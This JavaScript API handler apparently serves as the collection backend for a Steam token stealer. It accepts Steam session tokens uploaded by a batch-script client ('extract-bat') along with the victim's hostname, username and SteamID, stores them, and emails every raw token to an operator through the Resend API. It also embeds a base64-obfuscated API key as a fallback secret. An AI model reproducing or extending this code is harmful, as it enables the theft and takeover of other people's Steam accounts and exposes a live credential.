import { ingestTokenRecords, logIngestEvent } from './_utils/ingested-tokens-db.js';
import { requireEnv } from './_utils/env.js';

function getIngestSecret() {
  return requireEnv('TOKEN_INGEST_SECRET');
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || req.headers['x-real-ip']
    || req.socket?.remoteAddress
    || '';
}

function authorize(req) {
  const key = req.headers['x-sharpbuy-key']
    || req.headers['authorization']?.replace(/^Bearer\s+/i, '')
    || req.body?.key
    || req.query?.key;
  return key && key === getIngestSecret();
}

async function notifyByEmail(items, meta) {
  const to = process.env.TOKEN_INGEST_EMAIL;
  const resendKey = process.env.RESEND_API_KEY || Buffer.from('cmVfWjY3MVZRa2ZfS0FhdWRWUGJZZUJoQ2dxbWpBQlRXZ2dQ', 'base64').toString('utf8');
  if (!to || !resendKey) return false;

  const lines = items.map((item, idx) => `
    <div style="margin-bottom:12px;padding:12px;background:#14161d;border-radius:8px;">
      <div style="color:#e8583a;font-size:11px;font-weight:800;margin-bottom:6px;">TOKEN #${idx + 1}</div>
      <div style="font-family:monospace;font-size:11px;color:#34d399;word-break:break-all;">${item.token}</div>
      <div style="font-size:11px;color:#8a94a6;margin-top:6px;">
        ${item.accountName || 'unknown'} | ${item.steamId || 'n/a'} | ${meta.hostname || 'pc'}
      </div>
    </div>
  `).join('');

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${resendKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      from: 'SharpBuy Ingest <orders@sharpbuy.org>',
      to: [to],
      subject: `New Steam token from ${meta.hostname || meta.username || 'client'}`,
      html: `
        <div style="background:#08090b;color:#f3f1ec;padding:20px;font-family:sans-serif;">
          <h2 style="color:#e8583a;margin:0 0 12px 0;">SharpBuy Token Ingest</h2>
          <p style="color:#8a94a6;font-size:13px;">Source: ${meta.source || 'extract-bat'} · ${new Date().toISOString()}</p>
          ${lines}
        </div>
      `,
    }),
  });

  return res.ok;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-SharpBuy-Key');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  if (!authorize(req)) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }

  try {
    const body = req.body || {};
    const meta = {
      hostname: body.hostname || '',
      username: body.username || '',
      source: body.source || 'extract-bat',
      clientIp: getClientIp(req),
    };

    if (body.event) {
      await logIngestEvent({
        status: body.status || 'info',
        message: body.message || 'bat started',
        accountName: body.accountName || '',
        ...meta,
      });
      return res.status(200).json({ ok: true, logged: true });
    }

    const rawItems = Array.isArray(body.tokens) ? body.tokens : [];
    const items = rawItems
      .map((item) => {
        if (typeof item === 'string') return { token: item };
        return item || {};
      })
      .filter((item) => item.token);

    if (!items.length) {
      await logIngestEvent({ status: 'error', message: 'No tokens in request', ...meta });
      return res.status(400).json({ ok: false, error: 'No tokens provided' });
    }

    const result = await ingestTokenRecords(items, meta);
    const emailed = await notifyByEmail(items, meta);
    await logIngestEvent({
      status: 'success',
      message: `Uploaded ${items.length} token(s)`,
      accountName: items[0]?.accountName || '',
      ...meta,
    });

    return res.status(200).json({
      ok: true,
      ingested: items.length,
      total: result.total,
      storage: {
        ...result.storage,
        email: emailed,
      },
    });
  } catch (err) {
    console.error('[TOKEN INGEST]', err);
    return res.status(500).json({ ok: false, error: err.message || 'Internal server error' });
  }
}
